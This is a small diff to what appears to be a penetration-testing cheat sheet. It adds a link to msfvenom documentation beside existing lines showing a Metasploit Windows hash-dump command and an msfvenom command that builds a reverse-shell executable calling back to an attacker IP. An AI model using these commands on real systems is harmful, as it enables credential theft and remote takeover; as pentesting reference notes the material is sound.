@@ -45,6 +45,8 @@ Windows hashes: `run post/windows/gather/smart_hashdump`
 msfvenom
 --------
 
+* [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
+
 Typical Windows exe payload:
 
 `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe`  
